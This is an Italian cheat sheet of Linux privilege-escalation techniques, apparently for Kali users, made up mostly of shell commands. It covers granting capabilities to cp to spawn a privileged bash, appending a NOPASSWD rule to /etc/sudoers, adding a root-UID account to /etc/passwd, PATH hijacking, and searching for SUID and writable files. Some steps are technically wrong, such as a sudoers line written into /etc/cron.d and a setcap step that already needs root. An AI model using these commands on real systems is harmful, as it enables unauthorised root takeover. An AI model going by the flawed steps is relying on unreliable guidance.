
PRIVILEDGE ESCALATION -KALI LINUX

=> 1. CP CON CAP_DAC_OVERRIDE
La capability `cap_dac_read_search` permette di leggere qualsiasi file nel sistema, mentre `cap_dac_override` consente di bypassare i controlli dei permessi di lettura, scrittura ed esecuzione dei file.

  setcap cap_dac_read_search+ep /bin/cp
  setcap cap_dac_override+ep /bin/cp
  /bin/cp /bin/bash /tmp/bash
  /tmp/bash -p

=> 2. Modifica di /ETC/SUDOERS
Aggiungere o modificare voci in `/etc/sudoers` può concedere accesso root.

  echo "iltuonomeutente ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
  sudo su

=> 3. Sfruttamento dei Binari SUID
I binari SUID eseguiti con privilegi di root possono essere sfruttati se configurati in modo errato.

  find / -perm -4000 -type f 2>/dev/null
  # Controlla l'elenco dei binari SUID e sfrutta quelli vulnerabili

=> 4. Modifica dei CRON JOB (/ETC/CRON.D)
Se hai accesso in scrittura a un file cron job, puoi inserire comandi da eseguire con privilegi elevati.

  echo "iltuonomeutente ALL=(ALL) NOPASSWD:ALL" >> /etc/cron.d/rootjob

=> 5. Sfruttamento di /ETC/PASSWD SCRIVIBILE
Se `/etc/passwd` è scrivibile, è possibile aggiungere un nuovo utente con privilegi di root.

  openssl passwd -1 -salt root password
  echo "root2:<hashed_password>:0:0:root:/root:/bin/bash" >> /etc/passwd
  su root2

=> 6. Controllo dei FILE SCRIVIBILI DA TUTTI
I file scrivibili da tutti possono essere sovrascritti per eseguire l'escalation dei privilegi.

  find / -writable -type f 2>/dev/null

=> 7. Utilizzo delle VARIABILI D'AMBIENTE
Sfruttamento di script o binari che utilizzano variabili d'ambiente in modo insicuro.

  export PATH=/tmp:$PATH
  echo "/bin/bash" > /tmp/fakebinary
  chmod +x /tmp/fakebinary

=> 8. Sfruttamento di SERVIZI CONFIGURATI MALE
I servizi in esecuzione con privilegi elevati possono essere sfruttati.

  # Identifica i servizi
  ps aux | grep root
  # Sfrutta le vulnerabilità in questi servizi

=> 9. Ispezione di FILE E DIRECTORY NASCOSTI
File e directory nascosti potrebbero contenere informazioni sensibili o configurazioni errate.

  find / -name ".*" 2>/dev/null





